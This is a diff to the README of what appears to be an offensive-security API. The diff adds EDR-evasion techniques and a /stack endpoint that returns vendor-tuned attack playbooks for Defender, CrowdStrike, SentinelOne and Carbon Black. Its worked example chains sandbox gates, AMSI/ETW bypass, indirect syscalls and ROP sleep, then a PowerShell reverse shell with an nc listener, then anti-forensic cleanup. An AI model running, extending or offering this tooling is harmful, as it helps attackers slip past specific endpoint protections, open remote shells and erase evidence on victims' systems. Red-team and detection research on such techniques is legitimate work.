@@ -128,7 +128,8 @@ Platforms: `teams, slack, okta, o365, github, generic`.
 | GET/POST | `/lateral` | WMI, PsExec, WinRM, DCOM, schtasks, PtH, evil-winrm, xfreerdp. |
 | GET/POST | `/adattack` | Kerberoast, ASREProast, DCSync, golden/silver/ACL tickets, GPP, zerologon check. |
 | GET/POST | `/privesc` | UAC bypasses, unquoted paths, service perms, potatoes, DLL hijack. |
-| GET/POST | `/evasion` | 31 techniques — AMSI/ETW (reflection + CLR patch + **hardware-breakpoint patchless** + provider unregister + WLDP downgrade), CLM bypass, Defender exclusion/disable, LOLBAS (**mshta, regsvr32, certutil, msbuild, installutil, cmstp, msxsl, wmic_xsl, syncappv, pubprn**), PS downgrade, **direct/indirect syscalls** (HellsGate/SysWhispers3), **NTDLL unhook**, **Ekko sleep masking**, **PPID spoof**, **process hollowing**, **module stomping**, **thread hijack**. |
+| GET/POST | `/evasion` | 43 techniques — AMSI/ETW (reflection + CLR patch + **hardware-breakpoint patchless** + provider unregister + WLDP downgrade), CLM bypass, Defender exclusion/disable, 10 LOLBAS (mshta, regsvr32, certutil, msbuild, installutil, cmstp, msxsl, wmic_xsl, syncappv, pubprn), PS downgrade, direct/indirect syscalls, NTDLL unhook, Ekko sleep, PPID spoof, process hollowing/stomping/thread-hijack, **ROP sleep**, **SetWindowsHookEx loader**, **COM ROT injection**, **environment keying**, **in-memory PE loader**, **DLL sideloading**, **APC + Early-Bird APC injection**, **Heaven's Gate WoW64 pivot**, **Process Ghosting / Doppelganging / Herpaderping**. |
+| POST | `/stack` | **EDR-aware evasion orchestrator** — given `{edr, lhost, lport, language}` returns an ordered playbook tuned to the named vendor (defender, crowdstrike, sentinelone, carbonblack, generic). Each step ships with a rationale. |
 | GET/POST | `/anti_forensics` | Post-engagement artifact cleanup — event log wipe, USN journal, Prefetch, Recent files, Recycle Bin, Jump Lists, ShellBags, Amcache, PS history, file time-stomping, ADS payload hiding, self-deletion stub. |
 | GET/POST | `/sandbox_evasion` | Environment gates — VM detection (CPUID / WMI / artifacts), uptime + RAM + screen-resolution + recent-files + domain-joined sandbox checks, geofencing, time-delay, anti-debug (IsDebuggerPresent + CheckRemoteDebuggerPresent + PEB NtGlobalFlag). |
 
@@ -204,6 +205,67 @@ curl -X POST http://localhost:8080/chain \
 This produces a sequenced playbook: gate execution to a real corporate endpoint,
 disable AMSI + ETW patchlessly, wipe EDR userland hooks, spoof the parent PID,
 run the reverse shell, and clean up traces on exit.
+
+## EDR-aware evasion stack — `/stack`
+
+Instead of hand-composing a chain, ask the API for a sequence tuned to the
+specific EDR you're up against:
+
+```bash
+curl -X POST http://localhost:8080/stack \
+  -H "Authorization: Bearer $API_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "edr": "crowdstrike",
+    "lhost": "10.0.0.5",
+    "lport": 4444,
+    "language": "powershell"
+  }'
+```
+
+Response (truncated):
+
+```json
+{
+  "edr": "crowdstrike",
+  "total_steps": 9,
+  "listener": "rlwrap nc -lvnp 4444    # connect-back from 10.0.0.5",
+  "summary": "crowdstrike evasion stack with 9 steps. Payload: powershell ...",
+  "chain": [
+    { "step": 1, "module": "sandbox_evasion", "technique": "sandbox_check_user_interaction",
+      "rationale": "Falcon Sandbox doesn't simulate mouse movement; gate on it", "command": "..." },
+    { "step": 2, "module": "sandbox_evasion", "technique": "sandbox_check_uptime",
+      "rationale": "Falcon's pre-execution scan in cloud takes ~3 min; gate on 20+ min uptime", "command": "..." },
+    { "step": 4, "module": "evasion", "technique": "indirect_syscalls",
+      "rationale": "Falcon's userland hooks AND callstack inspection — indirect syscalls land inside ntdll.dll", "command": "..." },
+    { "step": 6, "module": "evasion", "technique": "rop_sleep",
+      "rationale": "Falcon snapshots memory during sleep — ROP sleep mask defeats the scanner", "command": "..." },
+    { "step": 8, "module": "shell", "technique": "powershell",
+      "rationale": "Reverse shell payload", "command": "powershell -NoP -NonI ..." }
+  ]
+}
+```
+
+### Supported EDR profiles
+
+| Profile | Tuned for |
+|---|---|
+| `defender` | Microsoft Defender for Endpoint — patchless AMSI/ETW, WLDP downgrade, NTDLL unhook, PPID spoof |
+| `crowdstrike` | Falcon — indirect syscalls (clean callstacks), Early-Bird APC, ROP sleep, ETW patchless |
+| `sentinelone` | Singularity Active EDR — patchless AMSI, NTDLL unhook, ROP sleep (anti memory scanner), module stomping |
+| `carbonblack` | VMware Carbon Black — DLL sideloading via reputation-trusted binaries, classic AMSI/ETW bypass |
+| `generic` | Vendor-agnostic best effort — patchless AMSI+ETW, NTDLL unhook, PPID spoof |
+
+Flags:
+
+| Flag | Default | Effect |
+|---|---|---|
+| `include_anti_forensics` | `true` | Append cleanup steps after the payload |
+| `include_sandbox_evasion` | `true` | Prepend sandbox/VM gates before the payload |
+| `seed` | unset | Deterministic shell payload (for tests/docs) |
+
+Order is load-bearing: sandbox gates first, evasion bypasses next, payload, then
+cleanup. The stack is fully deterministic for a given `(edr, options)` tuple.
 
 ---
 
